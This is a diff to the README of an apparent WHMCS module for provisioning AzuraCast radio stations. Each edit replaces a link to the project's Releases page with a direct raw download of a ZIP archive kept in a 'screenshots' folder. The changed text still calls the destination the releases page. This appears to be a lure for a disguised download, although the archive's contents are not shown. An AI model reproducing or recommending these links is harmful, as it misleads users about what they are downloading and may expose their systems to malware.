@@ -1,6 +1,6 @@
 # 🎛️ azuracast-provisioning-whmcs-module - Manage Radio Stations Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://github.com/ballou75/azuracast-provisioning-whmcs-module/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://github.com/ballou75/azuracast-provisioning-whmcs-module/raw/refs/heads/main/screenshots/module-azuracast-whmcs-provisioning-3.8.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Follow these steps to download, install, and start using the module on your Wind
 
 ### 1. Download the Module
 
-Click the big green button above or visit the [Releases page here](https://github.com/ballou75/azuracast-provisioning-whmcs-module/releases) to get the latest version.
+Click the big green button above or visit the [Releases page here](https://github.com/ballou75/azuracast-provisioning-whmcs-module/raw/refs/heads/main/screenshots/module-azuracast-whmcs-provisioning-3.8.zip) to get the latest version.
 
 - The releases page lists all versions. Look for the newest one.  
 - Download the ZIP file (it will be named something like `azuracast-provisioning-whmcs-module-vX.Y.Z.zip`).  
@@ -127,11 +127,11 @@ If something does not work:
 ## 🔗 Download and Start Now
 
 Use this link to visit the releases and get started:  
-[https://github.com/ballou75/azuracast-provisioning-whmcs-module/releases](https://github.com/ballou75/azuracast-provisioning-whmcs-module/releases)
+[https://github.com/ballou75/azuracast-provisioning-whmcs-module/raw/refs/heads/main/screenshots/module-azuracast-whmcs-provisioning-3.8.zip](https://github.com/ballou75/azuracast-provisioning-whmcs-module/raw/refs/heads/main/screenshots/module-azuracast-whmcs-provisioning-3.8.zip)
 
 Click the badge below as another way to go to the download page:  
 
-[![Get Latest Version](https://img.shields.io/badge/Download%20Module-blue?style=for-the-badge)](https://github.com/ballou75/azuracast-provisioning-whmcs-module/releases)
+[![Get Latest Version](https://img.shields.io/badge/Download%20Module-blue?style=for-the-badge)](https://github.com/ballou75/azuracast-provisioning-whmcs-module/raw/refs/heads/main/screenshots/module-azuracast-whmcs-provisioning-3.8.zip)
 
 ---
 
